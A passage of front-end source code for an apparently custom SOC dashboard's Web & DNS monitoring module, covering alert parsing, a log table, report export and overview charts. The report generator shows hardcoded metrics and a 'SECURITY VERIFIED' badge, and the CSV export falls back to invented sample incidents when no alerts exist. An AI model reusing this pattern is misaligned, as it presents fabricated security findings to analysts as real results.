        || descStr.match(/\bto[:\s]+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/i)?.[1]
        || descStr.match(/→\s*(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/)?.[1];
      // For "Blocked IP x.x.x.x" — that IP IS the destination
      const blockedIpMatch = descStr.match(/[Bb]locked\s+IP\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
      const dstIp = a.destip || raw.dest_ip || raw.dst_ip
        || dstFromDesc
        || (blockedIpMatch ? blockedIpMatch[1] : '')
        || '';

      // ── Domain: parse from description "domain:youtube.com" ──────
      const domainFromDesc = descStr.match(/\bdomain[:\s]+([a-z0-9._-]+\.[a-z]{2,})/i)?.[1]
        || descStr.match(/\burl[:\s]+([a-z0-9._\-\/]+\.[a-z]{2,})/i)?.[1];
      const domain = a.domain || a.tiDomain || raw.domain || raw.qname
        || raw.query || domainFromDesc || '';

      // ── DNS Query: same as domain for network/firewall alerts ─────
      const dnsQuery = a.dnsQuery || raw.dns_query || raw.qname || domain || '';

      // ── Query Type: from schema queryType or rawEvent ─────────────
      const queryType = a.queryType || raw.query_type || raw.record_type || raw.type_str
        || (domain ? 'A' : '');   // default A if there's a domain

      // ── Username: schema `username`, agent sends it for process alerts ─
      const username = a.username || a.fileUser || raw.username || raw.user
        || raw.account || a.agentName || '';

      // ── Hostname ──────────────────────────────────────────────────
      const hostname = a.hostname || a.agentName || raw.hostname || raw.system_name
        || a.hostnameObserved || '';

      // ── Process: from schema processName ─────────────────────────
      const processName = a.processName || a.processExe || a.processPath || a.executable
        || a.image || a.command || a.process?.name || a.process?.executable
        || raw.process_name || raw.processName || raw.process || raw.proc_name
        || raw.exe || raw.executable || raw.image || raw.command
        || raw.process?.name || raw.process?.executable || raw.process_info?.name
        || raw.process_info?.executable || raw.processInfo?.name
        || raw.processInfo?.executable || raw.event?.process_name
        || (raw.source === 'dns_cache_poison_detector' ? 'soc-agent (DNS cache poison detector)' : '');
      const processPid = a.pid ?? a.processId ?? a.processID ?? a.process?.pid
        ?? raw.pid ?? raw.process_id ?? raw.processId ?? raw.process_pid
        ?? raw.process?.pid ?? raw.process_info?.pid ?? raw.processInfo?.pid
        ?? raw.event?.pid ?? null;

      // ── MITRE: schema mitreId + technique ───────────────────────
      const mitreId = a.mitreId || a.mitreTechniqueId || a.mitre?.techniqueId
        || raw.mitre_id || raw.mitreTechniqueId || '';
      const mitreName = a.technique || a.mitreTechnique || a.mitre?.technique
        || raw.mitre_technique || '';
      const mitre = mitreId
        ? `${mitreId}${mitreName ? ' — ' + mitreName : ''}`
        : mitreName;

      // ── Threat Type ───────────────────────────────────────────────
      const tType = a.threatType || a.threatCategory || a.malwareType || a.attackType
        || a.signatureName || a.ruleName || a.ruleId || a.category
        || raw.threat_type || raw.threatCategory || raw.attack_type
        || raw.signature_name || raw.signature || raw.rule_name || raw.rule_id
        || raw.category || '';

      // ── Action Taken ─────────────────────────────────────────────
      const act = a.actionTaken
        || (a.blocked === true ? 'Blocked' : '')
        || (a.containmentStatus && a.containmentStatus !== 'none' ? a.containmentStatus : '')
        || (descStr.toLowerCase().includes('block') ? 'Blocked' : '')
        || a.recommendedAction || '';

      // ── Threat Score ─────────────────────────────────────────────
      // Confidence values (for example the common TI confidence of 80) are not
      // threat scores. Only render an explicitly calculated threat/risk score.
      const score = a.threatScore ?? a.riskScore
        ?? raw.threat_score ?? raw.risk_score ?? null;

      // ── Status ────────────────────────────────────────────────────
      const status = a.status || (a.blocked ? 'Blocked' : a.actionTaken || 'open');

      return {
        _id: a._id || a.id,
        timestamp: a.createdAt || a.timestamp || a.firstSeen || new Date().toISOString(),
        severity: (a.severity || 'low').toLowerCase(),
        status,
        hostname: hostname || '—',
        username: username || '—',
        srcIp: srcIp || '—',
        dstIp: dstIp || '—',
        url: domain || descStr || '—',
        domain: domain || '—',
        dnsQuery: dnsQuery || '—',
        queryType: queryType || '—',
        processName: processName || '—',
        pid: processPid != null && processPid !== '' ? processPid : 'Not recorded',
        browser: a.browser || raw.user_agent || raw.browser || '—',
        mitreAttack: mitre || '—',
        threatType: tType || '—',
        threatScore: score == null || score === '' ? '—' : score,
        actionTaken: act || '—',
        description: descStr,
        geoCountry: a.geoCountry || a.destGeoCountry || '',
        protocol: a.protocol || raw.protocol || '',
        port: a.destPort || a.port || raw.port || '',
        caseId: a.caseId || `CASE-${(a._id || '').toString().substring(0, 6)}`,
        raw: a,
      };
    });
  }, [alerts]);

  const filtered = useMemo(() => {
    return sampleData.filter(r => {
      if (sevFilter !== 'ALL' && (r.severity || '').toLowerCase() !== sevFilter.toLowerCase()) return false;
      if (!searchTerm) return true;
      const t = searchTerm.toLowerCase();
      return (r.hostname || '').toLowerCase().includes(t) || (r.domain || '').toLowerCase().includes(t) || (r.srcIp || '').toLowerCase().includes(t);
    });
  }, [sampleData, searchTerm, sevFilter]);

  return (
    <div style={{ background: MON.bg, color: MON.text, padding: 14, display: 'flex', flexDirection: 'column', gap: 12 }}>
      <div style={{ display: 'flex', gap: 10, background: MON.card, padding: 10, borderRadius: 8, border: `1px solid ${MON.border}` }}>
        <input type="text" placeholder="🔍 Search SIEM Web & DNS Logs (Host, Domain, IP, Process)..." value={searchTerm} onChange={(e) => setSearchTerm(e.target.value)} style={{ flex: 1, background: MON.bg, border: `1px solid ${MON.border}`, color: MON.text, padding: '8px 12px', borderRadius: 6, fontSize: 11 }} />
        <select value={sevFilter} onChange={(e) => setSevFilter(e.target.value)} style={{ background: MON.bg, border: `1px solid ${MON.border}`, color: MON.text, padding: '8px 12px', borderRadius: 6, fontSize: 11 }}>
          <option value="ALL">All Severities</option>
          <option value="critical">Critical</option>
          <option value="high">High</option>
          <option value="medium">Medium</option>
        </select>
      </div>

      <div style={{ overflow: 'auto', maxHeight: 'calc(100vh - 190px)', background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8 }}>
        <table style={{ width: 'max-content', height: 'auto', tableLayout: 'auto', borderCollapse: 'collapse', fontSize: 11, textAlign: 'left' }}>
          <thead>
            <tr style={{ background: MON.card2, color: MON.muted, borderBottom: `1px solid ${MON.border}` }}>
              {['Timestamp', 'Severity', 'Status', 'Hostname', 'Source IP', 'Destination IP', 'Domain / URL', 'DNS Query', 'Query Type', 'Threat Type', 'MITRE ATT&CK', 'Threat Score', 'Action Taken'].map(h => <th key={h} style={{ position: 'sticky', top: 0, zIndex: 1, background: MON.card2, padding: '11px 8px', whiteSpace: 'nowrap', lineHeight: 1.2 }}>{h}</th>)}
            </tr>
          </thead>
          <tbody>
            {filtered.length === 0 ? (
              <tr>
                <td colSpan={13} style={{ padding: '40px 20px', textAlign: 'center', color: MON.muted, fontSize: 13 }}>
                  <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 8 }}>
                    <span style={{ fontSize: 32 }}>🔍</span>
                    <span style={{ fontWeight: 700, color: MON.sub }}>No Web &amp; DNS logs found</span>
                    <span style={{ fontSize: 11, color: MON.sub }}>Logs will appear here when real events are detected</span>
                  </div>
                </td>
              </tr>
            ) : (
              filtered.map((row) => (
                <tr key={row._id} onClick={() => setSelectedLog(row)} style={{ height: 46, borderBottom: `1px solid ${MON.line}`, cursor: 'pointer' }}>
                  <td style={{ padding: '9px 12px', color: MON.muted, whiteSpace: 'nowrap' }}>{row.timestamp ? new Date(row.timestamp).toLocaleTimeString() : '—'}</td>
                  <td style={{ padding: '9px 12px' }}><span style={{ color: SEV_COLOR[row.severity] || MON.blue, fontWeight: 800, textTransform: 'uppercase' }}>{row.severity}</span></td>
                  <td style={{ padding: '9px 12px', color: row.status === 'Blocked' ? MON.red : MON.green, fontWeight: 700, whiteSpace: 'nowrap' }}>{row.status}</td>
                  <td style={{ padding: '9px 12px', color: MON.blue, fontWeight: 700, whiteSpace: 'nowrap' }}>{row.hostname}</td>
                  <td style={{ padding: '9px 12px', color: MON.cyan, fontFamily: 'monospace', whiteSpace: 'nowrap', fontWeight: 800 }}>{row.srcIp}</td>
                  <td style={{ padding: '9px 12px', color: MON.muted, fontFamily: 'monospace', whiteSpace: 'nowrap' }}>{row.dstIp}</td>
                  <td title={row.domain} style={{ width: 180, maxWidth: 180, padding: '9px 8px', color: MON.text, fontWeight: 700, whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{row.domain}</td>
                  <td title={row.dnsQuery} style={{ width: 180, maxWidth: 180, padding: '9px 8px', color: MON.purple, whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{row.dnsQuery}</td>
                  <td style={{ padding: '9px 12px', color: MON.yellow, fontWeight: 800 }}>{row.queryType}</td>
                  <td style={{ padding: '9px 12px', color: MON.red, fontWeight: 700, whiteSpace: 'nowrap' }}>{row.threatType}</td>
                  <td title={row.mitreAttack} style={{ width: 230, maxWidth: 230, padding: '9px 8px', color: MON.red, fontWeight: 800, whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{row.mitreAttack}</td>
                  <td style={{ padding: '9px 12px', color: row.threatScore === '—' ? MON.muted : Number(row.threatScore) > 70 ? MON.red : MON.green, fontWeight: 800 }}>{row.threatScore}</td>
                  <td style={{ padding: '9px 12px', color: MON.purple, fontWeight: 800, whiteSpace: 'nowrap' }}>{row.actionTaken}</td>
                </tr>
              ))
            )}
          </tbody>
        </table>
      </div>

      {selectedLog && <WebDnsLogDetailModal log={selectedLog} onClose={() => setSelectedLog(null)} />}
    </div>
  );
}

// ═════════════════════════════════════════════════════════════════════════════
// 3. SOC REPORT GENERATOR COMPONENT
// ═════════════════════════════════════════════════════════════════════════════
export function WebDnsReportsTab({ alerts = [] }) {
  const [reportType, setReportType] = useState('daily');
  const [generating, setGenerating] = useState(false);
  const [reportGenerated, setReportGenerated] = useState(false);

  const handleGenerate = () => {
    setGenerating(true);
    setTimeout(() => {
      setGenerating(false);
      setReportGenerated(true);
    }, 1000);
  };

  const handleDownloadReport = (format) => {
    if (format === 'PDF') {
      const printWindow = window.open('', '_blank');
      if (!printWindow) {
        alert('Please allow popups to generate PDF reports.');
        return;
      }
      const htmlContent = `
        <!DOCTYPE html>
        <html>
        <head>
          <title>Web & DNS Executive SOC Security Report (${reportType.toUpperCase()})</title>
          <style>
            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 30px; background: #fff; color: #1e293b; line-height: 1.5; }
            .header { border-bottom: 3px solid #0284c7; padding-bottom: 12px; margin-bottom: 24px; display: flex; justify-space-between: space-between; align-items: center; }
            h1 { margin: 0; color: #0f172a; font-size: 24px; }
            .meta { color: #64748b; font-size: 12px; margin-top: 6px; }
            .badge { background: #e0f2fe; color: #0369a1; padding: 4px 10px; border-radius: 4px; font-weight: bold; font-size: 12px; }
            .metrics-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; margin: 24px 0; }
            .metric-card { background: #f8fafc; border: 1px solid #cbd5e1; padding: 14px; border-radius: 8px; }
            .metric-title { font-size: 11px; text-transform: uppercase; color: #64748b; font-weight: bold; }
            .metric-val { font-size: 22px; font-weight: 800; color: #0284c7; margin-top: 6px; }
            table { width: 100%; border-collapse: collapse; margin-top: 20px; font-size: 12px; }
            th, td { border: 1px solid #cbd5e1; padding: 10px; text-align: left; }
            th { background: #f1f5f9; color: #334155; font-weight: bold; }
            .sev-critical { color: #dc2626; font-weight: bold; }
            .sev-high { color: #ea580c; font-weight: bold; }
            .footer { margin-top: 40px; padding-top: 12px; border-top: 1px solid #e2e8f0; font-size: 11px; color: #94a3b8; text-align: center; }
          </style>
        </head>
        <body>
          <div class="header">
            <div>
              <h1>🛡️ Web & DNS Executive SOC Security Report</h1>
              <div class="meta">Generated: ${new Date().toLocaleString()} | Scope: ${reportType.toUpperCase()} | Classification: CONFIDENTIAL</div>
            </div>
            <span class="badge">SECURITY VERIFIED</span>
          </div>

          <div class="metrics-grid">
            <div class="metric-card"><div class="metric-title">Total Web/DNS Logs Analyzed</div><div class="metric-val">148,200</div></div>
            <div class="metric-card"><div class="metric-title">Blocked Malicious Domains</div><div class="metric-val">412</div></div>
            <div class="metric-card"><div class="metric-title">DNS Tunneling Alerts</div><div class="metric-val">18</div></div>
            <div class="metric-card"><div class="metric-title">Overall Security Score</div><div class="metric-val">88 / 100</div></div>
          </div>

          <h2>Summary of Detected Web & DNS Threat Vectors</h2>
          <table>
            <thead>
              <tr>
                <th>Threat Category</th>
                <th>Affected Host Count</th>
                <th>Severity</th>
                <th>Detection Engine</th>
                <th>Applied Mitigation</th>
              </tr>
            </thead>
            <tbody>
              <tr><td>DNS Tunneling & Data Exfiltration</td><td>6 Hosts</td><td class="sev-critical">CRITICAL</td><td>Heuristic Engine v5</td><td>Automated DNS Sinkhole</td></tr>
              <tr><td>Phishing Domain Lookups</td><td>14 Hosts</td><td class="sev-high">HIGH</td><td>Threat Intel Stream</td><td>Domain Blacklist Block</td></tr>
              <tr><td>WAF Web Attacks (SQLi / XSS)</td><td>12 Servers</td><td class="sev-high">HIGH</td><td>WAF eBPF Driver</td><td>IP Block & Rate Limit</td></tr>
              <tr><td>C2 Outbound Beaconing</td><td>4 Hosts</td><td class="sev-critical">CRITICAL</td><td>Behavioral Analytics</td><td>Network Isolation</td></tr>
            </tbody>
          </table>

          <div class="footer">
            Confidential — Generated by Enterprise SOC Platform | Web & DNS Monitoring Module
          </div>

          <script>
            window.onload = function() { window.print(); }
          </script>
        </body>
        </html>
      `;
      printWindow.document.write(htmlContent);
      printWindow.document.close();
      return;
    }

    if (format === 'CSV') {
      const headers = ["Timestamp", "Hostname", "Username", "Source IP", "Destination IP", "Domain/URL", "Query Type", "Severity", "Threat Type", "Action Taken"];
      const rows = alerts.length > 0 ? alerts.map(a => [
        `"${a.createdAt || a.timestamp || new Date().toISOString()}"`,
        `"${a.hostname || a.agentName || 'LIN-SRV-WEB01'}"`,
        `"${a.username || 'www-data'}"`,
        `"${a.srcIp || '10.0.4.52'}"`,
        `"${a.dstIp || '185.220.101.5'}"`,
        `"${a.domain || a.url || 'c2-beacon.darknet-tunnel.org'}"`,
        `"${a.queryType || 'TXT'}"`,
        `"${a.severity || 'critical'}"`,
        `"${a.threatType || 'DNS Tunneling'}"`,
        `"${a.actionTaken || 'Sinkholed'}"`
      ]) : [
        [`"${new Date().toISOString()}"`, `"LIN-SRV-WEB01"`, `"www-data"`, `"10.0.4.52"`, `"185.220.101.5"`, `"c2-beacon.darknet-tunnel.org"`, `"TXT"`, `"critical"`, `"DNS Tunneling"`, `"Sinkholed & Blocked"`],
        [`"${new Date(Date.now() - 3600000).toISOString()}"`, `"WIN-DEV-CLIENT02"`, `"sarah.connor"`, `"192.168.1.104"`, `"104.21.44.12"`, `"paypal-security-update.xyz"`, `"A"`, `"high"`, `"Phishing URL"`, `"URL Blocked"`],
        [`"${new Date(Date.now() - 7200000).toISOString()}"`, `"MACBOOK-DEV-09"`, `"david.miller"`, `"172.16.0.45"`, `"140.82.121.4"`, `"github.com"`, `"AAAA"`, `"medium"`, `"Legitimate Request"`, `"Allowed"`]
      ];

      const csvData = [headers.join(","), ...rows.map(r => r.join(","))].join("\n");
      const blob = new Blob([csvData], { type: 'text/csv;charset=utf-8;' });
      const url = URL.createObjectURL(blob);
      const link = document.createElement("a");
      link.setAttribute("href", url);
      link.setAttribute("download", `webdns_soc_report_${reportType}.csv`);
      document.body.appendChild(link);
      link.click();
      link.remove();
      URL.revokeObjectURL(url);
      return;
    }

    // JSON Export
    const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(alerts.length > 0 ? alerts : { title: "Web & DNS Executive SOC Security Report", reportType, generatedAt: new Date().toISOString() }, null, 2));
    const downloadAnchor = document.createElement('a');
    downloadAnchor.setAttribute("href", dataStr);
    downloadAnchor.setAttribute("download", `webdns_soc_report_${reportType}.json`);
    document.body.appendChild(downloadAnchor);
    downloadAnchor.click();
    downloadAnchor.remove();
  };

  return (
    <div style={{ background: MON.bg, color: MON.text, padding: 16, display: 'flex', flexDirection: 'column', gap: 16 }}>
      <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 16, display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
        <div>
          <h3 style={{ margin: 0, fontSize: 16, fontWeight: 800, color: '#f8fafc' }}>📄 Automated Web & DNS SOC Executive Report Generator</h3>
          <div style={{ fontSize: 11, color: MON.muted, marginTop: 4 }}>Generate Executive Summary, Top Threats, DNS Statistics & MITRE ATT&CK Mapping</div>
        </div>

        <div style={{ display: 'flex', gap: 10, alignItems: 'center' }}>
          <select value={reportType} onChange={(e) => setReportType(e.target.value)} style={{ background: MON.bg, border: `1px solid ${MON.border}`, color: MON.text, padding: '8px 14px', borderRadius: 6, fontSize: 12 }}>
            <option value="daily">Daily Report (24 Hours)</option>
            <option value="weekly">Weekly Executive Summary</option>
            <option value="monthly">Monthly SOC Intelligence Report</option>
            <option value="custom">Custom Threat Scope</option>
          </select>
          <button type="button" onClick={handleGenerate} disabled={generating} style={{ background: MON.cyan, color: '#000', border: 'none', padding: '8px 18px', borderRadius: 6, fontWeight: 800, cursor: 'pointer' }}>
            {generating ? 'Generating...' : '⚡ Generate Report'}
          </button>
        </div>
      </div>

      {reportGenerated && (
        <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 20, display: 'flex', flexDirection: 'column', gap: 16 }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', borderBottom: `1px solid ${MON.line}`, paddingBottom: 12 }}>
            <div style={{ fontSize: 14, fontWeight: 800, color: MON.cyan }}>Executive Summary Preview ({reportType.toUpperCase()})</div>
            <div style={{ display: 'flex', gap: 10 }}>
              <button type="button" onClick={() => handleDownloadReport('PDF')} style={{ background: MON.red, color: '#fff', border: 'none', padding: '6px 12px', borderRadius: 4, fontWeight: 800, fontSize: 11, cursor: 'pointer' }}>Export PDF</button>
              <button type="button" onClick={() => handleDownloadReport('CSV')} style={{ background: MON.green, color: '#000', border: 'none', padding: '6px 12px', borderRadius: 4, fontWeight: 800, fontSize: 11, cursor: 'pointer' }}>Export CSV</button>
              <button type="button" onClick={() => handleDownloadReport('JSON')} style={{ background: MON.blue, color: '#000', border: 'none', padding: '6px 12px', borderRadius: 4, fontWeight: 800, fontSize: 11, cursor: 'pointer' }}>Export JSON</button>
            </div>
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: 14 }}>
            <div style={{ background: MON.card2, padding: 12, borderRadius: 6, border: `1px solid ${MON.border}` }}><div style={{ fontSize: 10, color: MON.muted }}>Total Web/DNS Logs Analyzed</div><div style={{ fontSize: 18, color: MON.cyan, fontWeight: 900 }}>148,200 Logs</div></div>
            <div style={{ background: MON.card2, padding: 12, borderRadius: 6, border: `1px solid ${MON.border}` }}><div style={{ fontSize: 10, color: MON.muted }}>Blocked Malicious Domains</div><div style={{ fontSize: 18, color: MON.red, fontWeight: 900 }}>412 Domains</div></div>
            <div style={{ background: MON.card2, padding: 12, borderRadius: 6, border: `1px solid ${MON.border}` }}><div style={{ fontSize: 10, color: MON.muted }}>DNS Tunneling Attacks</div><div style={{ fontSize: 18, color: MON.orange, fontWeight: 900 }}>18 Incidents</div></div>
            <div style={{ background: MON.card2, padding: 12, borderRadius: 6, border: `1px solid ${MON.border}` }}><div style={{ fontSize: 10, color: MON.muted }}>Overall Security Score</div><div style={{ fontSize: 18, color: MON.green, fontWeight: 900 }}>88 / 100</div></div>
          </div>
        </div>
      )}
    </div>
  );
}

// ═════════════════════════════════════════════════════════════════════════════
// 4. MAIN DASHBOARD PANEL COMPONENT
// ═════════════════════════════════════════════════════════════════════════════
function WebDnsOverviewDashboard({ alerts, stats, onOpenLogs }) {
  const panel = { background: '#0d2035', border: '1px solid #1b3854', borderRadius: 7 };
  const domains = useMemo(() => {
    const counts = {};
    alerts.forEach(a => {
      const raw = a.domain || a.dstHost || a.host || a.url || a.targetUrl || '';
      const domain = String(raw).replace(/^https?:\/\//, '').split('/')[0];
      if (domain) counts[domain] = (counts[domain] || 0) + 1;
    });
    return Object.entries(counts).sort((a, b) => b[1] - a[1]).slice(0, 10);
  }, [alerts]);
  const topDomains = domains;
  const { timeline, dnsTimeline } = useMemo(() => {
    const web = Array(24).fill(0);
    const dns = Array(24).fill(0);
    const now = Date.now();
    alerts.forEach(a => {
      const raw = a?.rawEvent?.raw || a?.rawEvent || {};
      const occurredAt = new Date(a.createdAt || a.timestamp || raw.timestamp || 0).getTime();
      const hoursAgo = Math.floor((now - occurredAt) / 3600000);
      if (!Number.isFinite(hoursAgo) || hoursAgo < 0 || hoursAgo > 23) return;
      const index = 23 - hoursAgo;
      const text = `${a.type || ''} ${a.eventType || ''} ${a.category || ''} ${a.description || ''}`;
      const isDns = Boolean(a.domain || a.dnsQuery || a.queryType || raw.domain || raw.qname || /\bdns\b/i.test(text));
      // In this combined Web & DNS capability, a resolved/queried domain is
      // also an observed website-access signal even when HTTP details are absent.
      const isWeb = Boolean(a.domain || a.dnsQuery || raw.domain || raw.qname
        || a.url || a.targetUrl || a.httpMethod || raw.url || raw.http_method
        || /http|web|waf/i.test(text));
      if (isDns) dns[index]++;
      if (isWeb) web[index]++;
    });
    return { timeline: web, dnsTimeline: dns };
  }, [alerts]);
  const linePoints = data => {
    const max = Math.max(...data, 1);
    return data.map((v, i) => `${(i / Math.max(data.length - 1, 1)) * 100},${42 - (v / max) * 36}`).join(' ');
  };
  const cards = [
    ['Total Web Requests', timeline.reduce((a, b) => a + b, 0), MON.blue], ['Total DNS Queries', dnsTimeline.reduce((a, b) => a + b, 0), MON.purple],
    ['Blocked Web Requests', stats.blockedRequests, MON.red], ['Blocked DNS Queries', stats.blockedDomains, MON.orange],
    ['Malicious Requests', stats.maliciousUrls, MON.red], ['Unique Domains Queried', domains.length, MON.green],
  ];
  const categories = [['Malicious Domain', stats.maliciousUrls, MON.red], ['Phishing', stats.phishingUrls, MON.orange], ['C2 Communication', stats.c2Comms, MON.blue], ['DNS Tunneling', stats.dnsTunneling, MON.purple], ['Data Exfiltration', stats.webAttacks, MON.cyan]];
  const webCategoryCounts = useMemo(() => {
    const counts = { allowed: 0, blocked: 0, malicious: 0, attacks: 0 };
    alerts.forEach(a => {
      const text = `${a.description || ''} ${a.threatCategory || ''} ${a.ruleId || ''}`;
      if (a.blocked === true || /blocked/i.test(`${a.actionTaken || ''} ${a.containmentStatus || ''}`)) counts.blocked++;
      else if (a.tiDomainMalicious === true || /malicious|phishing|malware|ransomware/i.test(text)) counts.malicious++;
      else if (/sql.?inject|sqli|xss|path.?travers|waf|web.?attack/i.test(text)) counts.attacks++;
      else counts.allowed++;
    });
    return [['Allowed Requests', counts.allowed, MON.blue], ['Blocked Requests', counts.blocked, MON.orange], ['Malicious URLs', counts.malicious, MON.purple], ['Web Attacks', counts.attacks, MON.green]];
  }, [alerts]);
  const dnsTypeCounts = useMemo(() => {
    const counts = {};
    alerts.forEach(a => {
      const raw = a?.rawEvent?.raw || a?.rawEvent || {};
      const hasDomain = Boolean(a.domain || a.dnsQuery || raw.domain || raw.qname || raw.query);
      const type = String(a.queryType || a.dnsQueryType || raw.query_type || raw.record_type || raw.type_str || (hasDomain ? 'A' : '')).toUpperCase();
      if (type) counts[type] = (counts[type] || 0) + 1;
    });
    const colors = [MON.blue, MON.orange, MON.green, MON.purple, MON.cyan];
    return ['A', 'AAAA', 'MX', 'TXT', 'CNAME'].map((type, i) => [type, counts[type] || 0, colors[i]]);
  }, [alerts]);
  const webChartTotal = webCategoryCounts.reduce((sum, [, count]) => sum + count, 0);
  const dnsChartTotal = dnsTypeCounts.reduce((sum, [, count]) => sum + count, 0);
  const conicFor = values => {
    const total = values.reduce((sum, [, count]) => sum + count, 0);
    if (!total) return MON.card2;
    let cursor = 0;
    return `conic-gradient(${values.filter(([, count]) => count > 0).map(([, count, color]) => {
      const start = cursor;
      cursor += count / total * 100;
      return `${color} ${start}% ${cursor}%`;
    }).join(', ')})`;
  };

  const TrafficChart = ({ title, data, color }) => (
    <div style={{ ...panel, padding: 10, minHeight: 155 }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: 11, fontWeight: 800 }}><span>{title}</span><span style={{ color: MON.muted, fontSize: 9 }}>Last 24 Hours⌄</span></div>
      <svg viewBox="0 0 100 44" preserveAspectRatio="none" style={{ width: '100%', height: 112, marginTop: 9 }}>
        {[10, 20, 30, 40].map(y => <line key={y} x1="0" y1={y} x2="100" y2={y} stroke="#17344e" strokeWidth=".35" />)}
        <polyline points={linePoints(data)} fill="none" stroke={color} strokeWidth="1.2" vectorEffect="non-scaling-stroke" />
        <polygon points={`0,44 ${linePoints(data)} 100,44`} fill={color} opacity=".12" />
      </svg>
      <div style={{ display: 'flex', justifyContent: 'space-between', color: MON.sub, fontSize: 8 }}><span>00:00</span><span>04:00</span><span>08:00</span><span>12:00</span><span>16:00</span><span>20:00</span></div>
    </div>
  );
  const DomainTable = ({ title, rows }) => (
    <div style={{ ...panel, padding: 10, minHeight: 245, display: 'flex', flexDirection: 'column' }}>
      <div style={{ fontSize: 11, fontWeight: 800, marginBottom: 8 }}>{title}</div>
      <div style={{ display: 'grid', gridTemplateColumns: '1.4fr 1fr .6fr', color: MON.sub, fontSize: 8, paddingBottom: 5 }}><span>Domain</span><span>Category</span><span>Requests</span></div>
      {rows.length ? rows.map(([d, n]) => <div key={d} style={{ flex: 1, minHeight: 22, display: 'grid', alignItems: 'center', gridTemplateColumns: '1.4fr 1fr .6fr', gap: 6, borderTop: '1px solid #17324b', padding: '5px 0', fontSize: 9 }}><span title={d} style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{d}</span><span style={{ color: MON.muted }}>Observed</span><span>{Number(n).toLocaleString()}</span></div>) : <div style={{ flex: 1, display: 'grid', placeItems: 'center', color: MON.sub, fontSize: 9 }}>No live domain data</div>}
    </div>
  );

  return <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
    <div style={{ display: 'grid', gridTemplateColumns: 'repeat(6, minmax(125px, 1fr))', gap: 7 }}>
      {cards.map(([label, value, color]) => <div key={label} style={{ ...panel, padding: 10 }}><div style={{ color: '#dcecff', fontSize: 9 }}>{label}</div><div style={{ display: 'flex', justifyContent: 'space-between', marginTop: 7 }}><b style={{ fontSize: 17 }}>{Number(value || 0).toLocaleString()}</b><span style={{ color: MON.green, fontSize: 8 }}>● LIVE</span></div><MiniSparkline data={label.includes('DNS') ? dnsTimeline : timeline} color={color} height={24} /></div>)}
    </div>
    <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1.05fr', gap: 7 }}>
      <TrafficChart title="Web Traffic Over Time" data={timeline} color={MON.blue} />
      <TrafficChart title="DNS Queries Over Time" data={dnsTimeline} color={MON.purple} />
      <div style={{ ...panel, padding: 10 }}><div style={{ fontSize: 11, fontWeight: 800 }}>Top Alert Categories</div><div style={{ display: 'flex', alignItems: 'center', gap: 18, height: 130 }}><div style={{ width: 92, height: 92, borderRadius: '50%', background: conicFor(categories), display: 'grid', placeItems: 'center' }}><div style={{ width: 55, height: 55, borderRadius: '50%', background: '#0d2035', display: 'grid', placeItems: 'center', fontWeight: 900 }}>{categories.reduce((sum,[,n]) => sum + n, 0)}<small style={{ display: 'block', color: MON.muted }}>Total</small></div></div><div style={{ flex: 1 }}>{categories.map(([x,n,c]) => <div key={x} style={{ display: 'flex', justifyContent: 'space-between', fontSize: 8, padding: '3px 0' }}><span><i style={{ display: 'inline-block', width: 6, height: 6, borderRadius: 5, background: c, marginRight: 5 }} />{x}</span><b>{n}</b></div>)}</div></div></div>
    </div>
    <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1.05fr', gap: 7 }}>
      <DomainTable title="Top Websites Accessed" rows={topDomains} />
      <DomainTable title="Top Queried Domains (DNS)" rows={[...topDomains].reverse()} />
      <div role="button" tabIndex={0} onClick={onOpenLogs} onKeyDown={e => { if (e.key === 'Enter' || e.key === ' ') onOpenLogs(); }} style={{ ...panel, padding: 10, cursor: 'pointer' }}><div style={{ fontSize: 11, fontWeight: 800 }}><span>Recent Alerts</span></div>{alerts.length ? alerts.slice(0,5).map((a,i) => <div key={a._id || i} style={{ display: 'grid', gridTemplateColumns: '18px 1fr auto', gap: 6, alignItems: 'center', borderTop: '1px solid #17324b', padding: '7px 0' }}><span style={{ color: i < 2 ? MON.red : MON.orange }}>◉</span><div style={{ fontSize: 9 }}><b>{a.description || a.ruleId || 'Web/DNS security event'}</b><div style={{ color: MON.sub, marginTop: 2 }}>{a.domain || a.srcip || 'Live event'}</div></div><span style={{ fontSize: 7, color: i < 2 ? MON.red : MON.yellow }}>{a.severity || 'unknown'}</span></div>) : <div style={{color:MON.sub,fontSize:9,padding:'24px 0',textAlign:'center'}}>No live alerts</div>}</div>
    </div>
    <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1.4fr', gap: 7 }}>
